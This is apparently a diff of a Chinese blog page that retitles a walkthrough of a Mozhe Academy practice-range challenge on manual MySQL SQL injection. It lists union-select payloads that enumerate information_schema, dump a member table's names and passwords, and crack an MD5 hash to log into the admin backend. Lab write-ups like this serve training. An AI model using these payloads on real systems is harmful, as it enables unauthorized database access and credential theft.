@@ -8,7 +8,7 @@
   
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
   <title>
-    墨者学院-MySQL数据库攻略 |  Tranquillity
+    SQL手工注入漏洞测试(MySQL数据库)-解题思路 |  Tranquillity
   </title>
   <meta name="generator" content="hexo-theme-yilia-plus">
   
@@ -33,7 +33,7 @@
   <div id="app">
     <main class="content">
       <section class="outer">
-  <article id="post-墨者学院-MySQL数据库攻略" class="article article-type-post" itemscope
+  <article id="post-SQL手工注入漏洞测试(MySQL数据库)-解题思路" class="article article-type-post" itemscope
   itemprop="blogPost" data-scroll-reveal>
 
   <div class="article-inner">
@@ -41,7 +41,7 @@
     <header class="article-header">
        
 <h1 class="article-title sea-center" style="border-left:0" itemprop="name">
-  墨者学院-MySQL数据库攻略
+  SQL手工注入漏洞测试(MySQL数据库)-解题思路
 </h1>
   
 
@@ -50,12 +50,12 @@
 
     
     <div class="article-meta">
-      <a href="/2020/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2-MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E7%95%A5/" class="article-date">
+      <a href="/2020/SQL%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95(MySQL%E6%95%B0%E6%8D%AE%E5%BA%93)-%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF/" class="article-date">
   <time datetime="2020-01-07T08:43:11.000Z" itemprop="datePublished">2020-01-07</time>
 </a>
       
   <div class="article-category">
-    <a class="article-category-link" href="/categories/%E6%94%BB%E7%95%A5/">攻略</a> / <a class="article-category-link" href="/categories/%E6%94%BB%E7%95%A5/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2%E9%9D%B6%E5%9C%BA/">墨者学院靶场</a>
+    <a class="article-category-link" href="/categories/%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF/">解题思路</a> / <a class="article-category-link" href="/categories/%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2%E9%9D%B6%E5%9C%BA/">墨者学院靶场</a>
   </div>
 
       
@@ -101,24 +101,24 @@
 
       
       <h4 id="1-判断是否存在注入点，使用and语句判断注入点类型："><a href="#1-判断是否存在注入点，使用and语句判断注入点类型：" class="headerlink" title="1. 判断是否存在注入点，使用and语句判断注入点类型："></a>1. 判断是否存在注入点，使用and语句判断注入点类型：</h4><pre><code>/new_list.php?id=1 and 1=1 --+
-/new_list.php?id=1 and 1=2 --+ </code></pre><p><img src="/2020/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2-MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E7%95%A5/1.png" alt></p>
+/new_list.php?id=1 and 1=2 --+ </code></pre><p><img src="/2020/SQL%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95(MySQL%E6%95%B0%E6%8D%AE%E5%BA%93)-%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF/1.png" alt></p>
 <a id="more"></a>
-<p><img src="/2020/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2-MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E7%95%A5/2.png" alt></p>
+<p><img src="/2020/SQL%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95(MySQL%E6%95%B0%E6%8D%AE%E5%BA%93)-%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF/2.png" alt></p>
 <h4 id="2-使用order-by语句判断存在多少列："><a href="#2-使用order-by语句判断存在多少列：" class="headerlink" title="2. 使用order by语句判断存在多少列："></a>2. 使用order by语句判断存在多少列：</h4><pre><code>/new_list.php?id=1 order by 4 --+  //显示数据
-/new_list.php?id=1 order by 5 --+  //页面空白</code></pre><p><img src="/2020/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2-MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E7%95%A5/3.png" alt></p>
-<h4 id="3-由步骤2得知，当前表存在4列，使用union-select-判断显示数据的位置，注意此时id的值为false时union查询的语句才会显示："><a href="#3-由步骤2得知，当前表存在4列，使用union-select-判断显示数据的位置，注意此时id的值为false时union查询的语句才会显示：" class="headerlink" title="3. 由步骤2得知，当前表存在4列，使用union select 判断显示数据的位置，注意此时id的值为false时union查询的语句才会显示："></a>3. 由步骤2得知，当前表存在4列，使用union select 判断显示数据的位置，注意此时id的值为false时union查询的语句才会显示：</h4><p><img src="/2020/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2-MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E7%95%A5/4.png" alt></p>
+/new_list.php?id=1 order by 5 --+  //页面空白</code></pre><p><img src="/2020/SQL%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95(MySQL%E6%95%B0%E6%8D%AE%E5%BA%93)-%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF/3.png" alt></p>
+<h4 id="3-由步骤2得知，当前表存在4列，使用union-select-判断显示数据的位置，注意此时id的值为false时union查询的语句才会显示："><a href="#3-由步骤2得知，当前表存在4列，使用union-select-判断显示数据的位置，注意此时id的值为false时union查询的语句才会显示：" class="headerlink" title="3. 由步骤2得知，当前表存在4列，使用union select 判断显示数据的位置，注意此时id的值为false时union查询的语句才会显示："></a>3. 由步骤2得知，当前表存在4列，使用union select 判断显示数据的位置，注意此时id的值为false时union查询的语句才会显示：</h4><p><img src="/2020/SQL%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95(MySQL%E6%95%B0%E6%8D%AE%E5%BA%93)-%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF/4.png" alt></p>
 <h4 id="4-由步骤3得知，数据显示的位置为2和3，构造语句查询information-schema库获得库、表、列："><a href="#4-由步骤3得知，数据显示的位置为2和3，构造语句查询information-schema库获得库、表、列：" class="headerlink" title="4. 由步骤3得知，数据显示的位置为2和3，构造语句查询information_schema库获得库、表、列："></a>4. 由步骤3得知，数据显示的位置为2和3，构造语句查询information_schema库获得库、表、列：</h4><pre><code>/new_list.php?id=0 union select 1,database(),3,4 --+  //获得当前数据库名：mozhe_Discuz_StormGroup
 /new_list.php?id=0 union select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=&quot;mozhe_Discuz_StormGroup&quot; --+  //获得当前数据库的所有表：StormGroup_member,notice
-/new_list.php?id=0 union select 1,group_concat(column_name),3,4 from information_schema.columns where table_schema=&quot;mozhe_Discuz_StormGroup&quot; and table_name=&quot;StormGroup_member&quot; --+  //获得StormGroup_member表的所有列：id,name,password,status</code></pre><p><img src="/2020/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2-MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E7%95%A5/5.png" alt></p>
-<h4 id="5-使用group-concat-函数和union联合查询语句获得数据，使用“-”符号隔开："><a href="#5-使用group-concat-函数和union联合查询语句获得数据，使用“-”符号隔开：" class="headerlink" title="5. 使用group_concat()函数和union联合查询语句获得数据，使用“~”符号隔开："></a>5. 使用group_concat()函数和union联合查询语句获得数据，使用“~”符号隔开：</h4><p><img src="/2020/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2-MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E7%95%A5/6.png" alt></p>
-<h4 id="6-复制status为1的密码进行MD5解密："><a href="#6-复制status为1的密码进行MD5解密：" class="headerlink" title="6. 复制status为1的密码进行MD5解密："></a>6. 复制status为1的密码进行MD5解密：</h4><p><img src="/2020/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2-MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E7%95%A5/7.png" alt></p>
+/new_list.php?id=0 union select 1,group_concat(column_name),3,4 from information_schema.columns where table_schema=&quot;mozhe_Discuz_StormGroup&quot; and table_name=&quot;StormGroup_member&quot; --+  //获得StormGroup_member表的所有列：id,name,password,status</code></pre><p><img src="/2020/SQL%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95(MySQL%E6%95%B0%E6%8D%AE%E5%BA%93)-%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF/5.png" alt></p>
+<h4 id="5-使用group-concat-函数和union联合查询语句获得数据，使用“-”符号隔开："><a href="#5-使用group-concat-函数和union联合查询语句获得数据，使用“-”符号隔开：" class="headerlink" title="5. 使用group_concat()函数和union联合查询语句获得数据，使用“~”符号隔开："></a>5. 使用group_concat()函数和union联合查询语句获得数据，使用“~”符号隔开：</h4><p><img src="/2020/SQL%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95(MySQL%E6%95%B0%E6%8D%AE%E5%BA%93)-%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF/6.png" alt></p>
+<h4 id="6-复制status为1的密码进行MD5解密："><a href="#6-复制status为1的密码进行MD5解密：" class="headerlink" title="6. 复制status为1的密码进行MD5解密："></a>6. 复制status为1的密码进行MD5解密：</h4><p><img src="/2020/SQL%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95(MySQL%E6%95%B0%E6%8D%AE%E5%BA%93)-%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF/7.png" alt></p>
 <h4 id="7-在首页使用账号密码登录后台，获得KEY，完成。"><a href="#7-在首页使用账号密码登录后台，获得KEY，完成。" class="headerlink" title="7. 在首页使用账号密码登录后台，获得KEY，完成。"></a>7. 在首页使用账号密码登录后台，获得KEY，完成。</h4>
       
       <!-- 打赏 -->
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2020/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2-MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E7%95%A5/" data-id="ck57yrt1e0009c0wrghe07gme"
+      <a data-url="http://yoursite.com/2020/SQL%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95(MySQL%E6%95%B0%E6%8D%AE%E5%BA%93)-%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF/" data-id="ck58aroai0004rowrfxregl6o"
         class="article-share-link">Share</a>
       
     </footer>
@@ -129,19 +129,19 @@
   
   <nav class="article-nav">
     
-      <a href="/2020/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2-Apache-Struts2%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%94%BB%E7%95%A5/" class="article-nav-link">
+      <a href="/2020/Apache%20Struts2%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(S2-016)%E5%A4%8D%E7%8E%B0-%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF/" class="article-nav-link">
         <strong class="article-nav-caption">上一篇</strong>
         <div class="article-nav-title">
           
-            墨者学院-Apache Struts2远程代码执行漏洞攻略
+            Apache Struts2远程代码执行漏洞(S2-016)复现-解题思路
           
         </div>
       </a>
     
     
-      <a href="/2020/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2-MongoDB%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E7%95%A5/" class="article-nav-link">
+      <a href="/2020/SQL%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95(MongoDB%E6%95%B0%E6%8D%AE%E5%BA%93)-%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF/" class="article-nav-link">
         <strong class="article-nav-caption">下一篇</strong>
-        <div class="article-nav-title">墨者学院-MongoDB数据库攻略</div>
+        <div class="article-nav-title">SQL手工注入漏洞测试(MongoDB数据库)-解题思路</div>
       </a>
     
   </nav>
